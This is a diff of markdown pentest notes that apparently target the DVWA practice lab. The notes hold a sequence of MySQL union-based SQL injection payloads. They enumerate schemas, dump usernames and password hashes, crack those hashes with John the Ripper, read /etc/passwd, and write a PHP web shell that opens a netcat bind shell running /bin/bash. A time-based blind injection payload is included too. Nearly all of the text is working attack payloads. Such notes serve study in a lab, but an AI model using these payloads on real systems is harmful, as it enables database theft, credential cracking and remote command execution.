@@ -44,32 +44,60 @@ hash-id -h 8d3533d75ae2c3966d7e0d4fcc69216b # get hash type
 The single quote is needed becase it ends the first raw query param value and<br>
 starts the sql injection statment.<br>
 The same is for the #, it comments the rest of the raw query, allowing the injection.<br>
+
 ```sql
 ' union select 1,2,3 #
+```
 
+```sql
 ' union select database(),user(),version() #
+```
 
+```sql
 -- same as
 select database(); # at mysql terminal
+```
 
+```sql
 ' union select '',table_schema,table_name from information_schema.tables #
+```
 
+```sql
 ' union select '',column_name,'' from information_schema.columns where table_name='accounts' #
+```
 
+```sql
 ' union select '',username,password from accounts #
+```
 
+```sql
 ' union select '',column_name,'' from information_schema.columns where table_name='users' #
+```
 
+```sql
 ' union select '',concat(first_name,':',password),'' from dvwa.users #
+```
 
+```sql
 # crack passwords with John the Ripper
 john passwords.txt --format=raw-MD5
 john passwords.txt --show --format=raw-MD5
+```
 
+```sql
 ' union select '','',load_file('/etc/passwd') #
+```
 
+```sql
 ' union select '','this is test','' into outfile '/tmp/mytest' #
+```
 
+```sql
 ' union select '<?php system("nc -lp 2222 -e /bin/bash"); ?>','','' into outfile '/tmp/myphp.php' #
+```
 
+```sql
+# blind sql, if the query works, the request will wait 2 seconds and prints out 0
+# meaning the password has the string 5f
+' union select password,sleep(2),'' from dvwa.users where password like "5f%" #
 ```
